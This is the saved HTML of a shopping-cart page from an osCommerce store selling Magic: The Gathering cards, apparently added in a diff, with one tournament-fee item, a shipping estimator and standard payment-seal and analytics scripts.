+    <td class="boxText"><a href="https://www.wizardscupboard.com/singles-c-100.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Singles">Singles-&gt;</a><br><a href="https://www.wizardscupboard.com/foils-c-1100.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Foils">Foils-&gt;</a><br><a href="https://www.wizardscupboard.com/sets-c-500.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Sets">Sets</a><br><a href="https://www.wizardscupboard.com/booster-boxes-c-210.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Booster Boxes">Booster Boxes</a><br><a href="https://www.wizardscupboard.com/booster-packs-c-220.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Booster Packs">Booster Packs</a><br><a href="https://www.wizardscupboard.com/other-sealed-product-c-230.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Other Sealed Product">Other Sealed Product</a><br><a href="https://www.wizardscupboard.com/specialty-items-c-300.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Specialty Items">Specialty Items</a><br><a href="https://www.wizardscupboard.com/accessories-c-600.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Accessories">Accessories</a><br><a href="https://www.wizardscupboard.com/other-ccgs-c-400.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Other CCG's">Other CCG's</a><br><a href="https://www.wizardscupboard.com/alternate-cards-c-1181.html?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Magic the Gathering Alternate Art Cards">Alternate Art Cards</a><br></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- categories_eof //-->
+<!-- info_pages //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Information</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><a target="_blank" href="wordpress/">Blog</a><br><a target="" href="https://www.wizardscupboard.com/dragon-sculptures-ip-11.html?osCsid=b1e08fcba3c3faefc0655b62969258c5">Dragon Sculptures</a><br><a target="" href="https://www.wizardscupboard.com/company-details-ip-5.html?osCsid=b1e08fcba3c3faefc0655b62969258c5">Company Details</a><br><a target="" href="https://www.wizardscupboard.com/shipping-returns-ip-6.html?osCsid=b1e08fcba3c3faefc0655b62969258c5">Shipping & Returns</a><br><a target="" href="ramblings.php">TWC Ramblings</a><br><a target="" href="news.php">News Archive</a><br><a target="" href="https://www.wizardscupboard.com/grading-ip-9.html?osCsid=b1e08fcba3c3faefc0655b62969258c5">Grading</a><br><a target="" href="faq.php">F.A.Q.</a><br><a target="" href="contact_us.php">Contact Us</a><br></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- info_pages_eof //-->
+
+<!-- information //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Tools</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td align="left" class="boxText"><a href="https://www.wizardscupboard.com/sell_to_us.php?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Buy Magic Cards">Sell to Us</a><br><a href="https://www.wizardscupboard.com/link_to_us.php?osCsid=b1e08fcba3c3faefc0655b62969258c5" title="Link to the Cupboard">Link to Us</a></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- information_eof //--><!-- topics //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Articles</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><a href="https://www.wizardscupboard.com/articles.php?osCsid=b1e08fcba3c3faefc0655b62969258c5">All Articles</a><br><a href="https://www.wizardscupboard.com/card-combos-t-3.html?osCsid=b1e08fcba3c3faefc0655b62969258c5">Card Combos</a>&nbsp;(2)<br><a href="https://www.wizardscupboard.com/decks-t-2.html?osCsid=b1e08fcba3c3faefc0655b62969258c5">Decks</a>&nbsp;(2)<br><a href="https://www.wizardscupboard.com/general-magic-t-1.html?osCsid=b1e08fcba3c3faefc0655b62969258c5">General Magic</a>&nbsp;(1)<br></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- topics_eof //--><!-- authors //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Articles by Author</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><form name="authors" action="https://www.wizardscupboard.com/articles.php" method="get"><select name="authors_id" onChange="this.form.submit();" size="1" style="width: 100%"><option value="" SELECTED>Please Select</option><option value="2">Gabriel Showers</option><option value="4">J. Turner</option><option value="3">Justin Vizaro</option><option value="1">The Wizard&#039;s Cupboar..</option></select><input type="hidden" name="osCsid" value="b1e08fcba3c3faefc0655b62969258c5"></form></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- authors_eof //-->
+<!-- information //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Promotion</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td align="left" class="boxText">Something special this way comes!</td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- information_eof //-->
+<!-- authorize_net logo //-->
+          <tr>
+            <td align="center">
+<!-- (c) 2005, 2010. Authorize.Net is a registered trademark of CyberSource Corporation --> <div class="AuthorizeNetSeal"> <script type="text/javascript" language="javascript">var ANS_customer_id="7a609ad3-f89a-44b6-98a5-ca3d1c0018d2";</script> <script type="text/javascript" language="javascript" src="//verify.authorize.net/anetseal/seal.js" ></script> <a href="http://www.authorize.net/" id="AuthorizeNetText" target="_blank">Credit Card Services</a> </div>
+
+            </td>
+          </tr>
+<!-- authorize_net logo //--><!-- left_navigation_eof //-->
+    </table></td>
+<!-- body_text //-->
+    <td width="100%" valign="top"><form name="cart_quantity" action="https://www.wizardscupboard.com/shopping_cart.php?action=update_product&amp;osCsid=b1e08fcba3c3faefc0655b62969258c5" method="post"><table border="0" width="100%" cellspacing="0" cellpadding="0">
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="pageHeading">Please remember that if you are shopping as a guest, once you create your account, your shopping cart items will merge.  Enjoy shopping!</td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" width="100%" height="10" border="0" alt=""></td>
+      </tr>
+      <tr>
+        <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="2" class="productListing">
+  <tr>
+    <td align="center" class="productListing-heading">Remove</td>
+    <td class="productListing-heading">Product(s)</td>
+    <td align="center" class="productListing-heading">Qty.</td>
+    <td align="right" class="productListing-heading">Total</td>
+  </tr>
+  <tr class="productListing-even">
+    <td align="center" class="productListing-data" valign="top"><input type="checkbox" name="cart_delete[]" value="36406"></td>
+    <td class="productListing-data"><table border="0" cellspacing="2" cellpadding="2">  <tr>    <td class="productListing-data" valign="top"><a href="https://www.wizardscupboard.com/tournament-1275-p-36406.html?osCsid=b1e08fcba3c3faefc0655b62969258c5"><b>tournament fee 12.75</b></a><span class="markProductOutOfStock">***</span>    </td>  </tr></table></td>
+    <td align="center" class="productListing-data" valign="top"><input type="text" name="cart_quantity[]" value="1" size="4"><input type="hidden" name="products_id[]" value="36406"></td>
+    <td align="right" class="productListing-data" valign="top"><b>$12.75</b></td>
+  </tr>
+</table>
+        </td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" width="100%" height="10" border="0" alt=""></td>
+      </tr>
+      <tr>
+        <td align="right" class="main"><b>Sub-Total: $12.75</b></td>
+      </tr>
+      <tr>
+        <td class="stockWarning" align="center"><br>Products marked with *** dont exist in desired quantity in our stock.<br>Please alter the quantity of products marked with (***)</td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" width="100%" height="10" border="0" alt=""></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="1" cellpadding="2" class="infoBox">
+          <tr class="infoBoxContents">
+            <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+              <tr>
+                <td width="10"><img src="images/pixel_trans.gif" width="10" height="1" border="0" alt=""></td>
+                <td class="main"><input type="image" src="includes/languages/english/images/buttons/button_update_cart.gif" alt="Update Cart" title=" Update Cart "></td>
+                <td align="right" class="main"><a href="https://www.wizardscupboard.com/checkout_shipping.php?osCsid=b1e08fcba3c3faefc0655b62969258c5"><img src="includes/languages/english/images/buttons/button_checkout.gif" width="98" height="30" border="0" alt="Checkout" title="Checkout"></a></td>
+                <td width="10"><img src="images/pixel_trans.gif" width="10" height="1" border="0" alt=""></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table></td>
+      </tr>
+      </form><tr>
+        <td><br><!-- shipping_estimator //-->
+<script language="JavaScript">
+  function shipincart_submit(sid){
+    if(sid){
+      document.estimator.sid.value=sid;
+    }
+    document.estimator.submit();
+    return false;
+  }
+</script>
+              <table align="center"><tr valign="top"><td>
+
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading"><b>Shipping Estimate</b></td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><form name="estimator" action="https://www.wizardscupboard.com/shopping_cart.php?osCsid=b1e08fcba3c3faefc0655b62969258c5" method="post"><input type="hidden" name="sid"><table>Please <a href="https://www.wizardscupboard.com/login.php?osCsid=b1e08fcba3c3faefc0655b62969258c5"><u>Log In</u></a>, to display your personal shipping costs.<br />&nbsp;<br /><tr><td colspan="3" class="main" nowrap>Country:&nbsp;<select name="country_id" style="width=200"><option value="">Please Select</option><option value="1">Afghanistan</option><option value="2">Albania</option><option value="3">Algeria</option><option value="4">American Samoa</option><option value="5">Andorra</option><option value="6">Angola</option><option value="7">Anguilla</option><option value="8">Antarctica</option><option value="9">Antigua and Barbuda</option><option value="10">Argentina</option><option value="11">Armenia</option><option value="12">Aruba</option><option value="13">Australia</option><option value="14">Austria</option><option value="15">Azerbaijan</option><option value="16">Bahamas</option><option value="17">Bahrain</option><option value="18">Bangladesh</option><option value="19">Barbados</option><option value="20">Belarus</option><option value="21">Belgium</option><option value="22">Belize</option><option value="23">Benin</option><option value="24">Bermuda</option><option value="25">Bhutan</option><option value="26">Bolivia</option><option value="27">Bosnia and Herzegowina</option><option value="28">Botswana</option><option value="29">Bouvet Island</option><option value="30">Brazil</option><option value="31">British Indian Ocean Territory</option><option value="32">Brunei Darussalam</option><option value="33">Bulgaria</option><option value="34">Burkina Faso</option><option value="35">Burundi</option><option value="36">Cambodia</option><option value="37">Cameroon</option><option value="38">Canada</option><option value="39">Cape Verde</option><option value="40">Cayman Islands</option><option value="41">Central African Republic</option><option value="42">Chad</option><option value="43">Chile</option><option value="44">China</option><option value="45">Christmas Island</option><option value="46">Cocos (Keeling) Islands</option><option value="47">Colombia</option><option value="48">Comoros</option><option value="49">Congo</option><option value="50">Cook Islands</option><option value="51">Costa Rica</option><option value="52">Cote D&#039;Ivoire</option><option value="53">Croatia</option><option value="54">Cuba</option><option value="55">Cyprus</option><option value="56">Czech Republic</option><option value="57">Denmark</option><option value="58">Djibouti</option><option value="59">Dominica</option><option value="60">Dominican Republic</option><option value="61">East Timor</option><option value="62">Ecuador</option><option value="63">Egypt</option><option value="64">El Salvador</option><option value="65">Equatorial Guinea</option><option value="66">Eritrea</option><option value="67">Estonia</option><option value="68">Ethiopia</option><option value="69">Falkland Islands (Malvinas)</option><option value="70">Faroe Islands</option><option value="71">Fiji</option><option value="72">Finland</option><option value="73">France</option><option value="75">French Guiana</option><option value="76">French Polynesia</option><option value="77">French Southern Territories</option><option value="78">Gabon</option><option value="79">Gambia</option><option value="80">Georgia</option><option value="81">Germany</option><option value="82">Ghana</option><option value="83">Gibraltar</option><option value="84">Greece</option><option value="85">Greenland</option><option value="86">Grenada</option><option value="87">Guadeloupe</option><option value="88">Guam</option><option value="89">Guatemala</option><option value="90">Guinea</option><option value="91">Guinea-bissau</option><option value="92">Guyana</option><option value="93">Haiti</option><option value="94">Heard and Mc Donald Islands</option><option value="95">Honduras</option><option value="96">Hong Kong</option><option value="97">Hungary</option><option value="98">Iceland</option><option value="99">India</option><option value="100">Indonesia</option><option value="101">Iran (Islamic Republic of)</option><option value="102">Iraq</option><option value="103">Ireland</option><option value="104">Israel</option><option value="105">Italy</option><option value="106">Jamaica</option><option value="107">Japan</option><option value="108">Jordan</option><option value="109">Kazakhstan</option><option value="110">Kenya</option><option value="111">Kiribati</option><option value="112">Korea, Democratic People&#039;s Republic of</option><option value="113">Korea, Republic of</option><option value="114">Kuwait</option><option value="115">Kyrgyzstan</option><option value="116">Lao People&#039;s Democratic Republic</option><option value="117">Latvia</option><option value="118">Lebanon</option><option value="119">Lesotho</option><option value="120">Liberia</option><option value="121">Libyan Arab Jamahiriya</option><option value="122">Liechtenstein</option><option value="123">Lithuania</option><option value="124">Luxembourg</option><option value="125">Macau</option><option value="126">Macedonia, The Former Yugoslav Republic of</option><option value="127">Madagascar</option><option value="128">Malawi</option><option value="129">Malaysia</option><option value="130">Maldives</option><option value="131">Mali</option><option value="132">Malta</option><option value="133">Marshall Islands</option><option value="134">Martinique</option><option value="135">Mauritania</option><option value="136">Mauritius</option><option value="137">Mayotte</option><option value="138">Mexico</option><option value="139">Micronesia, Federated States of</option><option value="140">Moldova, Republic of</option><option value="141">Monaco</option><option value="142">Mongolia</option><option value="143">Montserrat</option><option value="144">Morocco</option><option value="145">Mozambique</option><option value="146">Myanmar</option><option value="147">Namibia</option><option value="148">Nauru</option><option value="149">Nepal</option><option value="150">Netherlands</option><option value="151">Netherlands Antilles</option><option value="152">New Caledonia</option><option value="153">New Zealand</option><option value="154">Nicaragua</option><option value="155">Niger</option><option value="156">Nigeria</option><option value="157">Niue</option><option value="158">Norfolk Island</option><option value="159">Northern Mariana Islands</option><option value="160">Norway</option><option value="161">Oman</option><option value="162">Pakistan</option><option value="163">Palau</option><option value="164">Panama</option><option value="165">Papua New Guinea</option><option value="166">Paraguay</option><option value="167">Peru</option><option value="168">Philippines</option><option value="169">Pitcairn</option><option value="170">Poland</option><option value="171">Portugal</option><option value="172">Puerto Rico</option><option value="173">Qatar</option><option value="174">Reunion</option><option value="175">Romania</option><option value="176">Russian Federation</option><option value="177">Rwanda</option><option value="178">Saint Kitts and Nevis</option><option value="179">Saint Lucia</option><option value="180">Saint Vincent and the Grenadines</option><option value="181">Samoa</option><option value="182">San Marino</option><option value="183">Sao Tome and Principe</option><option value="184">Saudi Arabia</option><option value="185">Senegal</option><option value="236">Serbia, Republic of</option><option value="186">Seychelles</option><option value="187">Sierra Leone</option><option value="188">Singapore</option><option value="189">Slovakia (Slovak Republic)</option><option value="190">Slovenia</option><option value="191">Solomon Islands</option><option value="192">Somalia</option><option value="193">South Africa</option><option value="194">South Georgia and the South Sandwich Islands</option><option value="195">Spain</option><option value="196">Sri Lanka</option><option value="197">St. Helena</option><option value="198">St. Pierre and Miquelon</option><option value="199">Sudan</option><option value="200">Suriname</option><option value="201">Svalbard and Jan Mayen Islands</option><option value="202">Swaziland</option><option value="203">Sweden</option><option value="204">Switzerland</option><option value="205">Syrian Arab Republic</option><option value="206">Taiwan</option><option value="207">Tajikistan</option><option value="208">Tanzania, United Republic of</option><option value="209">Thailand</option><option value="210">Togo</option><option value="211">Tokelau</option><option value="212">Tonga</option><option value="213">Trinidad and Tobago</option><option value="214">Tunisia</option><option value="215">Turkey</option><option value="216">Turkmenistan</option><option value="217">Turks and Caicos Islands</option><option value="218">Tuvalu</option><option value="219">Uganda</option><option value="220">Ukraine</option><option value="221">United Arab Emirates</option><option value="222">United Kingdom</option><option value="223" SELECTED>United States</option><option value="224">United States Minor Outlying Islands</option><option value="225">Uruguay</option><option value="226">Uzbekistan</option><option value="227">Vanuatu</option><option value="228">Vatican City State (Holy See)</option><option value="229">Venezuela</option><option value="230">Viet Nam</option><option value="231">Virgin Islands (British)</option><option value="232">Virgin Islands (U.S.)</option><option value="233">Wallis and Futuna Islands</option><option value="234">Western Sahara</option><option value="235">Yemen</option><option value="237">Zaire</option><option value="238">Zambia</option><option value="239">Zimbabwe</option></select><br />Zip Code:&nbsp;<input type="text" name="zip_code" size="5">&nbsp;<td><a href="_" onclick="return shipincart_submit('');"><img src="includes/languages/english/images/buttons/button_update_cart.gif" width="122" height="30" border="0" alt="Update Cart" title="Update Cart"> </a></td></td></tr><tr><td colspan="3" class="main">&nbsp;</td></tr><tr><td class="main"><b>Carrier</b></td><td class="main" align="left"><b>Delivery Methods</b></td><td class="main" align="right"><b>Rates</b></td></tr><tr><td colspan="3" class="main"><img src="images/pixel_black.gif" width="100%" height="1" border="0" alt=""></td></tr><tr class=""><td class="main">&nbsp;&nbsp;&nbsp;</td><td class="main"><a title="Click to select this shipping method in the total." href="_" onclick="return shipincart_submit('spu_spu');">Store Pickup.&nbsp;(Store Pickup.)</a>&nbsp;&nbsp;&nbsp;</td><td align="right" class="main">$0.00</td></tr></table></form></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading"><b>Order Total Estimate</b></td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><table align="right">              <tr>
+                <td align="right" class="main">Sub-Total:</td>
+                <td align="right" class="main">$12.75</td>
+              </tr>              <tr>
+                <td align="right" class="main">Store-Wide Discount:</td>
+                <td align="right" class="main">$0.38</td>
+              </tr>              <tr>
+                <td align="right" class="main">Insurance/Handling:</td>
+                <td align="right" class="main">$0.67</td>
+              </tr>              <tr>
+                <td align="right" class="main">Total:</td>
+                <td align="right" class="main"><b>$13.04</b></td>
+              </tr></table></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+             </td></tr></table></td>
+      </tr>
+    </table></form></td>
+<!-- body_text_eof //-->
+    <td width="150" valign="top"><table border="0" width="150" cellspacing="0" cellpadding="2">
+<!-- right_navigation //-->
+<!-- shopping_cart //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Shopping Cart</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="https://www.wizardscupboard.com/shopping_cart.php?osCsid=b1e08fcba3c3faefc0655b62969258c5"><img src="images/infobox/arrow_right.gif" width="12" height="10" border="0" alt="more" title="more"></a><img src="images/infobox/corner_right.gif" width="11" height="14" border="0" alt=""></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><table border="0" width="100%" cellspacing="0" cellpadding="0"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td align="right" valign="top" class="infoBoxContents"><span class="newItemInCart">1&nbsp;x&nbsp;</span></td><td valign="top" class="infoBoxContents"><a href="https://www.wizardscupboard.com/tournament-1275-p-36406.html?osCsid=b1e08fcba3c3faefc0655b62969258c5"><span class="newItemInCart">tournament fee 12.75</span></a></td></tr></table></td>
+  </tr>
+  <tr>
+    <td class="boxText"><img src="images/pixel_black.gif" width="100%" height="1" border="0" alt=""></td>
+  </tr>
+  <tr>
+    <td align="right" class="boxText">$12.75</td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- shopping_cart_eof //-->
+<!-- specials //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Specials</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="https://www.wizardscupboard.com/specials.php?osCsid=b1e08fcba3c3faefc0655b62969258c5"><img src="images/infobox/arrow_right.gif" width="12" height="10" border="0" alt="more" title="more"></a><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td align="center" class="boxText"><a href="https://www.wizardscupboard.com/global-series-p-53243.html?osCsid=b1e08fcba3c3faefc0655b62969258c5"><img src="product_thumb.php?img=images/Global Series.jpg&amp;w=80&amp;h=66" width="80" height="66" border="0" alt="Global Series" title="Global Series"></a><br><a href="https://www.wizardscupboard.com/global-series-p-53243.html?osCsid=b1e08fcba3c3faefc0655b62969258c5">Global Series</a><br><s>$24.95</s><br><span class="productSpecialPrice">$19.95</span></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- specials_eof //-->
+<!-- reviews //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Reviews</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="https://www.wizardscupboard.com/reviews.php?osCsid=b1e08fcba3c3faefc0655b62969258c5"><img src="images/infobox/arrow_right.gif" width="12" height="10" border="0" alt="more" title="more"></a><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><div align="center"><a href="https://www.wizardscupboard.com/merfolk-sovereign-pri-25579.html?reviews_id=8720&amp;osCsid=b1e08fcba3c3faefc0655b62969258c5"><img src="product_thumb.php?img=images/cards/M10/merfolksovereign.jpg&amp;w=80&amp;h=114" width="80" height="114" border="0" alt="Merfolk Sovereign" title="Merfolk Sovereign"></a></div><a href="https://www.wizardscupboard.com/merfolk-sovereign-pri-25579.html?reviews_id=8720&amp;osCsid=b1e08fcba3c3faefc0655b62969258c5">play with a merfolk deck and you\'ll win! ..</a><br><div align="center"><img src="images/stars_5.gif" width="56" height="13" border="0" alt="5 of 5 Stars!" title="5 of 5 Stars!"></div></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- reviews_eof //--><!-- events_calendar //-->
+
+  <tr>
+    <td>
+            <iframe name="calendar" id="calendar" class="calendarBox" 
+                align="center" valign="top" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"
+                src="calendar_content.php?_month=&_year=">Sorry, your browser does not support iframes.</iframe>
+
+    </td>
+  </tr>
+<!-- events_calendar //-->
+
+<!--
+<tr>
+	<td>&nbsp;</td>
+</tr>
+<tr>
+	<td align="center"><img src="images/secure_seal.gif" alt="Secure Site"></td>
+</tr>
+//-->
+<!-- right_navigation_eof //-->
+    </table></td>
+  </tr>
+</table>
+<!-- body_eof //-->
+
+<!-- footer //-->
+
+<table border="0" width="1000" align="center" cellspacing="0" cellpadding="0">
+  <tr class="footer">
+    <td class="footer">&nbsp;&nbsp;Sunday September 29, 2019&nbsp;&nbsp;</td>
+    <td align="right" class="footer">&nbsp;&nbsp;148118578 page hits since Wednesday November 28, 2001&nbsp;&nbsp;</td>
+  </tr>
+</table>
+<br>
+<table border="0" width="1000" align="center" cellspacing="3" cellpadding="3">
+  <tr>
+    <td align="center" class="smallText">
+<a href="http://www.batchtech.com"><img border=0 src="images/batchtech_logo.gif" alt="Batch Technologies"></a><br><br>This site is best viewed at 1024 x 768 display running <a href="http://www.microsoft.com/windows/ie/default.asp" target="_blank"><u>Internet Explorer 5 or higher</u></a><br>Site structure originated from <a href="http://www.oscommerce.com" target="_blank">OSCommerce</a><br>All Magic the Gathering (mtg), Magic Cards, Magic the Gathering Cards scans © <a href="http://www.magicthegathering.com" target="_blank">Wizards of the Coast</a>    </td>
+  </tr>
+  <tr colspan="2">
+  	<td align="left">
+  	<!-- BOF show mobile link //-->
+		<!-- EOF show mobile link //-->
+  </td>
+	<td class="smallText" align="left"><a href="links.php">Links</a><br><br></td>
+	</tr>
+</table>
+<!-- footer_eof //-->
+<br>
+ <script src="https://ssl.google-analytics.com/urchin.js" type="text/javascript">
+ </script>
+ <script type="text/javascript">
+   _uacct="UA-2002620-1";
+   urchinTracker();
+ </script>
+<a href="http://www.instantssl.com" id="comodoTL">Comodo SSL Certificate</a>
+<script language="JavaScript" type="text/javascript">
+COT("https://www.wizardscupboard.com/images/secure_site.gif", "SC2", "none");
+</script></body>
 </html>
